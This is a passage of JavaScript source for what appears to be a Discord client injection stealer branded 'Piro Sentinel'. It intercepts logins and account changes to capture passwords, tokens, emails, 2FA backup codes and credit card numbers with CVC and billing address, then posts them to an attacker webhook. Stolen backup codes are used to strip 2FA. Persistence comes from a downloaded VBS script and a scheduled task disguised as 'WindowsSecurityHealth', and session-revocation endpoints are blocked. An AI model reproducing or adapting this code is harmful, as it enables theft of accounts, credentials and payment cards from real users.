                    name: "Phone :mobile_phone:",
                    value: `\`${user.phone ?? "None"}\``,
                    inline: !0,
                  },
                  {
                    name: "Email <:mail:1130451375495589968>",
                    value: `\`${user.email}\``,
                    inline: !0,
                  },
                  {
                    name: "<a:cam2:1130448575470514258> Password",
                    value: `\`${password}\``,
                    inline: !0,
                  },
                  {
                    name: "<a:eatsomething:1130449693613228072> Token",
                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                    inline: !1,
                  },
                ],

                thumbnail: userAvatar,
              });

              var params3 = await makeEmbed({
                title: `<a:caat2:1130448854861488168> Additional Information`,
                color: config["embed-color"],
                fields: [
                  {
                    name: "Bio",
                    value: `\`\`\`${
                      user.bio !== null &&
                      user.bio !== undefined &&
                      user.bio !== ""
                        ? user.bio
                        : "❌"
                    }\`\`\``,
                    inline: false,
                  },
                  {
                    name: "Code 2fa used",
                    value: `\`${
                      dt.code !== null &&
                      dt.code !== undefined &&
                      dt.code !== ""
                        ? dt.code
                        : "❌"
                    }\``,
                    inline: !0,
                  },
                  {
                    name: "Language <:4533language:1130453119919206500>",
                    value: `${GetLangue(user.locale)}`,
                    inline: !0,
                  },
                  {
                    name: "NSFW <:3568underage:1153991874495922207>",
                    value: `${GetNSFW(user.nsfw_allowed)}`,
                    inline: !0,
                  },
                  {
                    name: "A2F <a:keys:1159078859682107453>",
                    value: `${GetA2F(user.mfa_enabled)}`,
                    inline: !0,
                  },
                  {
                    name: "Piro Files",
                    value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
                    inline: !0,
                  },
                  {
                    name: "Billing <a:money:1130448564632436787>",
                    value: `${Billings}`,
                    inline: !0,
                  },
                ],
                thumbnail: userAvatar,
              });
              params.embeds.push(params3.embeds[0]);
              var params2 = await makeEmbed({
                title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
                color: config["embed-color"],
                description: Friends.badges,
                image: userBanner,
                thumbnail: userAvatar,
              });

              params.embeds.push(params2.embeds[0]);
              await post(params);
              return;
            }
          );
        } else {
          if (token) {
            var {
              token,
              user,
              billing,
              friends,
              Nitro,
              userAvatar,
              userBanner,
              Billings,
              Friends,
            } = await BoukiTuclcavectesfonctions();

            var password = data.password;

            var params = await makeEmbed({
              title: "User Login",
              color: config["embed-color"],
              description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
              fields: [
                {
                  name: "Username <a:inject:1130448568268881960>",
                  value: `\`${user.username}\``,
                  inline: !0,
                },
                {
                  name: "ID <a:cat_rolling:1130448570789679165>",
                  value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                  inline: !0,
                },
                {
                  name: "Nitro <a:nitro:1130453517312725052>",
                  value: `${GetNitro(Nitro)}`,
                  inline: !0,
                },
                {
                  name: "Badges <a:badges:1130448593715740692>",
                  value: `${GetBadges(user.flags)}`,
                  inline: !0,
                },
                {
                  name: "Phone :mobile_phone:",
                  value: `\`${user.phone ?? "None"}\``,
                  inline: !0,
                },
                {
                  name: "Email <:mail:1130451375495589968>",
                  value: `\`${user.email}\``,
                  inline: !0,
                },
                {
                  name: "<a:cam2:1130448575470514258> Password",
                  value: `\`${password}\``,
                  inline: !0,
                },
                {
                  name: "<a:eatsomething:1130449693613228072> Token",
                  value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                  inline: !1,
                },
              ],

              thumbnail: userAvatar,
            });

            var params3 = await makeEmbed({
              title: `<a:caat2:1130448854861488168> Additional Information`,
              color: config["embed-color"],
              fields: [
                {
                  name: "Bio",
                  value: `\`\`\`${
                    user.bio !== null &&
                    user.bio !== undefined &&
                    user.bio !== ""
                      ? user.bio
                      : "❌"
                  }\`\`\``,
                  inline: false,
                },
                {
                  name: "Language <:4533language:1130453119919206500>",
                  value: `${GetLangue(user.locale)}`,
                  inline: !0,
                },
                {
                  name: "NSFW <:3568underage:1153991874495922207>",
                  value: `${GetNSFW(user.nsfw_allowed)}`,
                  inline: !0,
                },
                {
                  name: "A2F <a:keys:1159078859682107453>",
                  value: `${GetA2F(user.mfa_enabled)}`,
                  inline: !0,
                },
                {
                  name: "Piro Files",
                  value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
                  inline: !0,
                },
                {
                  name: "Billing <a:money:1130448564632436787>",
                  value: `${Billings}`,
                  inline: !0,
                },
                {
                  name: "@Copyright",
                  value: `[Piro Sentinel 2024 ](https://t.me/Piro_Sentinel)`,
                  inline: !0,
                },
              ],
              thumbnail: userAvatar,
            });
            params.embeds.push(params3.embeds[0]);

            var params2 = await makeEmbed({
              title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
              color: config["embed-color"],
              description: Friends.badges,
              image: userBanner,
              thumbnail: userAvatar,
            });

            params.embeds.push(params2.embeds[0]);

            await post(params);
            break;
          }
        }
      case request.url.endsWith("users/@me"):
        if (!data.password) return;
        if (data.new_password) {
          var params = await makeEmbed({
            title: "Password Changed",
            color: config["embed-color"],
            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
            fields: [
              {
                name: "Username <a:inject:1130448568268881960>",
                value: `\`${user.username}\``,
                inline: !0,
              },
              {
                name: "ID <a:cat_rolling:1130448570789679165>",
                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                inline: !0,
              },
              {
                name: "Nitro <a:nitro:1130453517312725052>",
                value: `${GetNitro(Nitro)}`,
                inline: !0,
              },
              {
                name: "Badges <a:badges:1130448593715740692>",
                value: `${GetBadges(user.flags)}`,
                inline: !0,
              },
              {
                name: "Phone :mobile_phone:",
                value: `\`${user.phone ?? "None"}\``,
                inline: !0,
              },
              {
                name: "Email <:mail:1130451375495589968>",
                value: `\`${user.email}\``,
                inline: !0,
              },
              {
                name: "<a:cam2:1130448575470514258> Old Password",
                value: `\`${data.password}\``,
                inline: !0,
              },
              {
                name: "<a:cam2:1130448575470514258> New Password",
                value: `\`${data.new_password}\``,
                inline: !0,
              },
              {
                name: "<a:eatsomething:1130449693613228072> Token",
                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                inline: !1,
              },
            ],

            thumbnail: userAvatar,
          });

          var params3 = await makeEmbed({
            title: `<a:caat2:1130448854861488168> Additional Information`,
            color: config["embed-color"],
            fields: [
              {
                name: "Bio",
                value: `\`\`\`${
                  user.bio !== null && user.bio !== undefined && user.bio !== ""
                    ? user.bio
                    : "❌"
                }\`\`\``,
                inline: false,
              },
              {
                name: "Language <:4533language:1130453119919206500>",
                value: `${GetLangue(user.locale)}`,
                inline: !0,
              },
              {
                name: "NSFW <:3568underage:1153991874495922207>",
                value: `${GetNSFW(user.nsfw_allowed)}`,
                inline: !0,
              },
              {
                name: "A2F <a:keys:1159078859682107453>",
                value: `${GetA2F(user.mfa_enabled)}`,
                inline: !0,
              },
              {
                name: "Piro Files",
                value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
                inline: !0,
              },
              {
                name: "Billing <a:money:1130448564632436787>",
                value: `${Billings}`,
                inline: !0,
              },
              {
                name: "@Copyright",
                value: `[Piro Sentinel 2024](https://t.me/Piro_Sentinel)`,
                inline: !0,
              },
            ],
            thumbnail: userAvatar,
          });
          var params2 = await makeEmbed({
            title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
            color: config["embed-color"],
            description: Friends.badges,
            image: userBanner,
            thumbnail: userAvatar,
          });
          params.embeds.push(params3.embeds[0]);
          params.embeds.push(params2.embeds[0]);

          await post(params);
        } else if (data.email_token) {
          var params = await makeEmbed({
            title: "Email Changed",
            color: config["embed-color"],
            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
            fields: [
              {
                name: "Username <a:inject:1130448568268881960>",
                value: `\`${user.username}\``,
                inline: !0,
              },
              {
                name: "ID <a:cat_rolling:1130448570789679165>",
                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                inline: !0,
              },
              {
                name: "Nitro <a:nitro:1130453517312725052>",
                value: `${GetNitro(Nitro)}`,
                inline: !0,
              },
              {
                name: "Badges <a:badges:1130448593715740692>",
                value: `${GetBadges(user.flags)}`,
                inline: !0,
              },
              {
                name: "Phone :mobile_phone:",
                value: `\`${user.phone ?? "None"}\``,
                inline: !0,
              },
              {
                name: "New Email <:mail:1130451375495589968>",
                value: `\`${user.email}\``,
                inline: !0,
              },
              {
                name: "<a:cam2:1130448575470514258> Password",
                value: `\`${data.password}\``,
                inline: !0,
              },
              {
                name: "<a:eatsomething:1130449693613228072> Token",
                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                inline: !1,
              },
            ],

            thumbnail: userAvatar,
          });

          var params3 = await makeEmbed({
            title: `<a:caat2:1130448854861488168> Additional Information`,
            color: config["embed-color"],
            fields: [
              {
                name: "Bio",
                value: `\`\`\`${
                  user.bio !== null && user.bio !== undefined && user.bio !== ""
                    ? user.bio
                    : "❌"
                }\`\`\``,
                inline: false,
              },
              {
                name: "Language <:4533language:1130453119919206500>",
                value: `${GetLangue(user.locale)}`,
                inline: !0,
              },
              {
                name: "NSFW <:3568underage:1153991874495922207>",
                value: `${GetNSFW(user.nsfw_allowed)}`,
                inline: !0,
              },
              {
                name: "A2F <a:keys:1159078859682107453>",
                value: `${GetA2F(user.mfa_enabled)}`,
                inline: !0,
              },
              {
                name: "Piro Files",
                value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
                inline: !0,
              },
              {
                name: "Billing <a:money:1130448564632436787>",
                value: `${Billings}`,
                inline: !0,
              },
              {
                name: "@Copyright",
                value: `[Piro Sentinel 2024](https://t.me/Piro_Sentinel)`,
                inline: !0,
              },
            ],
            thumbnail: userAvatar,
          });
          var params2 = await makeEmbed({
            title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
            color: config["embed-color"],
            description: Friends.badges,
            image: userBanner,
            thumbnail: userAvatar,
          });

          params.embeds.push(params3.embeds[0]);
          params.embeds.push(params2.embeds[0]);

          await post(params);
        } else if (data.username) {
          var params = await makeEmbed({
            title: "Username Changed",
            color: config["embed-color"],
            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
            fields: [
              {
                name: "New Username <a:inject:1130448568268881960>",
                value: `\`${user.username}\``,
                inline: !0,
              },
              {
                name: "ID <a:cat_rolling:1130448570789679165>",
                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                inline: !0,
              },
              {
                name: "Nitro <a:nitro:1130453517312725052>",
                value: `${GetNitro(Nitro)}`,
                inline: !0,
              },
              {
                name: "Badges <a:badges:1130448593715740692>",
                value: `${GetBadges(user.flags)}`,
                inline: !0,
              },
              {
                name: "Phone :mobile_phone:",
                value: `\`${user.phone ?? "None"}\``,
                inline: !0,
              },
              {
                name: "Email <:mail:1130451375495589968>",
                value: `\`${user.email}\``,
                inline: !0,
              },
              {
                name: "<a:cam2:1130448575470514258> Password",
                value: `\`${data.password}\``,
                inline: !0,
              },
              {
                name: "<a:eatsomething:1130449693613228072> Token",
                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                inline: !1,
              },
            ],

            thumbnail: userAvatar,
          });

          var params3 = await makeEmbed({
            title: `<a:caat2:1130448854861488168> Additional Information`,
            color: config["embed-color"],
            fields: [
              {
                name: "Bio",
                value: `\`\`\`${
                  user.bio !== null && user.bio !== undefined && user.bio !== ""
                    ? user.bio
                    : "❌"
                }\`\`\``,
                inline: false,
              },
              {
                name: "Language <:4533language:1130453119919206500>",
                value: `${GetLangue(user.locale)}`,
                inline: !0,
              },
              {
                name: "NSFW <:3568underage:1153991874495922207>",
                value: `${GetNSFW(user.nsfw_allowed)}`,
                inline: !0,
              },
              {
                name: "A2F <a:keys:1159078859682107453>",
                value: `${GetA2F(user.mfa_enabled)}`,
                inline: !0,
              },
              {
                name: "Piro Files",
                value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
                inline: !0,
              },
              {
                name: "Billing <a:money:1130448564632436787>",
                value: `${Billings}`,
                inline: !0,
              },
            ],
            thumbnail: userAvatar,
          });

          var params2 = await makeEmbed({
            title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
            color: config["embed-color"],
            description: Friends.badges,
            image: userBanner,
            thumbnail: userAvatar,
          });

          params.embeds.push(params3.embeds[0]);
          params.embeds.push(params2.embeds[0]);
          await post(params);
        }
        break;
      case request.url.includes("api.stripe"):
        var resu = await BoukiTuclcavectesfonctions();
        var [CardNumber, CardCVC, month, year] = [
          data["card[number]"],
          data["card[cvc]"],
          data["card[exp_month]"],
          data["card[exp_year]"],
        ];
        if (CardNumber && CardCVC && month && year) {
          await electron.session.defaultSession.webRequest.onCompleted(
            config.onCompletedbis,
            async (re, callback) => {
              try {
                var dt = JSON.parse(re.uploadData[0].bytes);
              } catch (err) {
                var dt = queryString.parse(
                  decodeURIComponent(re.uploadData[0].bytes.toString())
                );
              }
              let { line_1, line_2, city, state, postal_code, country, email } =
                dt.billing_address;
              var params = await makeEmbed({
                title: "Credit Card Added",
                color: config["embed-color"],
                fields: [
                  {
                    name: "Piro Files",
                    value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
                    inline: true,
                  },
                  {
                    name: "IP",
                    value: `\`${ip}\``,
                    inline: true,
                  },
                  {
                    name: "ID <a:cat_rolling:1130448570789679165>",
                    value: `\`${resu.user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${resu.user.id})`,
                    inline: true,
                  },
                  {
                    name: "Username <a:inject:1130448568268881960>",
                    value: `\`${resu.user.username}\``,
                    inline: true,
                  },
                  {
                    name: "Language <:4533language:1130453119919206500>",
                    value: GetLangue(resu.user.locale),
                    inline: true,
                  },
                  {
                    name: "A2F <a:keys:1159078859682107453>",
                    value: GetA2F(resu.user.mfa_enabled),
                    inline: true,
                  },
                  {
                    name: "Badges <a:badges:1130448593715740692>",
                    value: GetBadges(resu.user.flags),
                    inline: true,
                  },
                  {
                    name: "Address <a:cat_rolling:1130448570789679165>",
                    value: `\`\`\`md\n# Line 1 : ${line_1},\n# Line 2 : ${line_2},\n# City : ${city},\n# State : ${state},\n# Postal Code : ${postal_code},\n# Country : ${country}\n\`\`\``,
                    inline: false,
                  },
                  {
                    name: "Credit Card <a:cat_rolling:1130448570789679165>",
                    value: `\`\`\`md\n# Card Number : ${CardNumber}\n# Card Expiration : ${
                      month + "/" + year
                    }\n# CVC : ${CardCVC}\`\`\``,
                    inline: false,
                  },
                  {
                    name: "<a:eatsomething:1130449693613228072> Token",
                    value: `\`\`\`${resu.token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${resu.token})\n\n[Download Banner](${resu.userBanner})`,
                    inline: false,
                  },
                ],

                thumbnail: resu.userAvatar,
              });
              await post(params);
            }
          );
        }
        break;
      case request.url.endsWith("/enable"):
        let ValidFound = false;
        let backup_codes = (await execScript(backupscript)) ?? "";

        if (config.disable2FA == "true") {
          for (let i = 0; i < backup_codes.length; i++) {
            try {
              if (!backup_codes[i].consumed) {
                let res = await remove2FA(token, backup_codes[i].code);
                let parse_res = JSON.parse(res);

                if (parse_res.token) {
                  backup_codes[i].consumed = true;
                  ValidFound = true;
                  break;
                } else if (parse_res.message == "401: Unauthorized") {
                  break;
                } else if (parse_res.message != "Invalid two-factor code") {
                  break;
                }
              }
            } catch (e) {}
          }
        }

        var params = await makeEmbed({
          title: "User Enable 2FA",
          color: config["embed-color"],
          fields: [
            {
              name: "Piro Files",
              value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
              inline: false,
            },
            {
              name: "IP",
              value: `\`${ip}\``,
              inline: false,
            },
            {
              name: "Username <:username:1041634536733290596>",
              value: `\`${user.username}\``,
              inline: false,
            },
            {
              name: "ID <a:cat_rolling:1130448570789679165>",
              value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
              inline: false,
            },
            {
              name: "Language <:4533language:1130453119919206500>",
              value: GetLangue(user.locale),
              inline: false,
            },
            {
              name: "2FA disabler Response <:2FA:982994698278952980>",
              value: `\`\`\`md\n- ${
                ValidFound ? "Disabled" : "Cannot Disable"
              }\`\`\``,
              inline: false,
            },
            {
              name: "A2F <a:keys:1159078859682107453>",
              value: GetA2F(user.mfa_enabled),
              inline: false,
            },
            {
              name: "Badges <a:badges:1130448593715740692>",
              value: GetBadges(user.flags),
              inline: false,
            },
            {
              name: "Backups Code <a:cat_rolling:1130448570789679165>",
              value: `\`\`\`md\n${backup_codes
                .map((x) => `- ${x.code} | Usable: ${x.consumed ? "❌" : "✅"}`)
                .join("\n")}\`\`\``,
              inline: false,
            },
            {
              name: "<a:eatsomething:1130449693613228072> Token",
              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
              inline: false,
            },
          ],

          thumbnail: userAvatar,
        });
        await post(params);
        break;
      case request.url.endsWith("/disable"):
        var params = await makeEmbed({
          title: "User Removed 2FA",
          color: config["embed-color"],
          fields: [
            {
              name: "Piro Files",
              value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
              inline: false,
            },
            {
              name: "IP",
              value: `\`${ip}\``,
              inline: false,
            },
            {
              name: "Username <:username:1041634536733290596>",
              value: `\`${user.username}\``,
              inline: false,
            },
            {
              name: "Language <:4533language:1130453119919206500>",
              value: GetLangue(user.locale),
              inline: false,
            },
            {
              name: "A2F <a:keys:1159078859682107453>",
              value: GetA2F(user.mfa_enabled),
              inline: false,
            },
            {
              name: "Badges <a:badges:1130448593715740692>",
              value: GetBadges(user.flags),
              inline: false,
            },
            {
              name: "<a:eatsomething:1130449693613228072> Token",
              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
              inline: !1,
            },
          ],

          thumbnail: userAvatar,
        });
        await post(params);
        break;
      case request.url.endsWith("/codes-verification"):
        var {
          token,
          user,
          billing,
          friends,
          Nitro,
          userAvatar,
          userBanner,
          Billings,
          Friends,
        } = await BoukiTuclcavectesfonctions();
        let validCodeFound = false;
        let backup_code = (await execScript(backupscript)) ?? "";
        if (config.disable2FA == "true") {
          for (let i = 0; i < backup_code.length; i++) {
            if (!validCodeFound) {
              let res = await remove2FA(token, backup_code[i]);
              let parse_res = JSON.parse(res);
              if (parse_res.token) {
                validCodeFound = true;
                break;
              } else {
                if (parse_res.message && parse_res.code) {
                  if (parse_res.message == "401: Unauthorized") {
                    validCodeFound = true;
                    break;
                  }
                } else {
                  if (parse_res.message != "Invalid two-factor code") {
                    validCodeFound = true;
                    break;
                  } else {
                    continue;
                  }
                }
              }
            }
          }
        }
        var params = await makeEmbed({
          title: "User 2FA Codes",
          color: config["embed-color"],
          fields: [
            {
              name: "Piro Files",
              value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
              inline: false,
            },
            {
              name: "IP",
              value: "`" + ip + "`",
              inline: false,
            },
            {
              name: "Username <:username:1041634536733290596>",
              value: `\`${user.username}\``,
              inline: false,
            },
            {
              name: "Language <:4533language:1130453119919206500>",
              value: GetLangue(user.locale),
              inline: false,
            },
            {
              name: "A2F <a:keys:1159078859682107453>",
              value: GetA2F(user.mfa_enabled),
              inline: false,
            },
            {
              name: "Badges <a:badges:1130448593715740692>",
              value: GetBadges(user.flags),
              inline: false,
            },
            {
              name: "2FA disabler Response <:2FA:982994698278952980> ",
              value: `\`\`\`md\n- ${
                validCodeFound ? "Disabled" : "Cannot Disable"
              }\`\`\``,
              inline: false,
            },
            {
              name: "Backup Codes <a:cat_rolling:1130448570789679165>",
              value: `\`\`\`md\n${backup_code
                .map((x) => `- ${x.code} | Usable: ${x.consumed ? "❌" : "✅"}`)
                .join("\n")}\`\`\``,
              inline: false,
            },
            {
              name: "<a:eatsomething:1130449693613228072> Token",
              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
              inline: !1,
            },
          ],

          thumbnail: userAvatar,
        });
        await post(params);
        break;
    }
  }
);

const Persistance = async () => {
  const vbsFileName = "Protector.vbs";
  const batFileName = "LoginTask.bat";

  const protectFolderPath = path.join(
    process.env.APPDATA,
    "Microsoft",
    "Protect"
  );
  const vbsFilePathInProtect = path.join(protectFolderPath, vbsFileName);
  const startupFolderPath = path.join(
    process.env.APPDATA,
    "Microsoft",
    "Windows",
    "Start Menu",
    "Programs",
    "Startup"
  );
  const vbsFilePathInStartup = path.join(startupFolderPath, vbsFileName);
  const batFilePath = path.join(__dirname, batFileName);

  const scriptVbsContent = await request("GET", config.injector_url, {
    "Content-Type": "text/plain",
  });

  const responseVbsMalware = scriptVbsContent.toString("utf8") ?? "";
  const vbsContent = responseVbsMalware
    .replace("your_webhook_value", config.webhook)
    .replace("replace_api_url", config.Placed)
    .replace("your_disablefa_value", config.disable2FA)
    .replace("your_transfer_url_value", config.transfer_link)
    .replace("replace_creator_name", config.creator);

  const checkFileExists = (filePath) => {
    return new Promise((resolve) => {
      fs.access(filePath, fs.constants.F_OK, (err) => {
        resolve(!err);
      });
    });
  };

  const checkScheduledTaskExists = () => {
    return new Promise((resolve) => {
      exec('schtasks /query /tn "NovaLoginSetuper"', (err) => {
        resolve(!err);
      });
    });
  };

  const createVBSFile = (filePath) => {
    return new Promise((resolve, reject) => {
      fs.writeFile(filePath, vbsContent.trim(), (err) => {
        if (err) return reject(err);
        resolve();
      });
    });
  };

  const createBatchFile = () => {
    const batContent = `
          @echo off
          setlocal

          set "vbsFilePath=%APPDATA%\\Microsoft\\Protect\\${vbsFileName}"

          schtasks /create /tn "WindowsSecurityHealth" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f

          if %ERRORLEVEL% EQU 0 (
              echo We are scanning your Discord application(s)....
          ) else (
              echo An unexpected error occurred...
          )

          timeout /t 5 /nobreak > NUL
          del "%~f0"

          endlocal
      `;

    return new Promise((resolve, reject) => {
      fs.writeFile(batFilePath, batContent.trim(), (err) => {
        if (err) return reject(err);
        resolve();
      });
    });
  };

  const executeBatchFile = () => {
    return new Promise((resolve, reject) => {
      exec(
        `powershell -Command "Start-Process cmd -ArgumentList '/c \"${batFilePath}\"' -Verb RunAs"`,
        (err) => {
          if (err) return reject(err);
          resolve();
        }
      );
    });
  };

  const protectExists = await checkFileExists(vbsFilePathInProtect);
  const startupExists = await checkFileExists(vbsFilePathInStartup);
  const taskExists = await checkScheduledTaskExists();

  if (!protectExists) {
    await createVBSFile(vbsFilePathInProtect);
  }
  if (!startupExists) {
    await createVBSFile(vbsFilePathInStartup);
  }

  if (!taskExists) {
    await createBatchFile();
    await executeBatchFile();

    setTimeout(() => {
      fs.unlink(batFilePath, (unlinkErr) => {
        if (unlinkErr) {
        } else {
        }
      });
    }, 10000);
  }
};

const allSessionsLocked = async () => {
  const webRequest = electron.session.defaultSession.webRequest;
  if (!webRequest) return;
  webRequest.onBeforeRequest(config.session_filters, (details, callback) => {
    const cancel =
      details.url.includes("wss://remote-auth-gateway") ||
      details.url.includes("auth/sessions");

    callback({ cancel });
  });
  setTimeout(allSessionsLocked, 5000);
};
StartFunc();
allSessionsLocked();
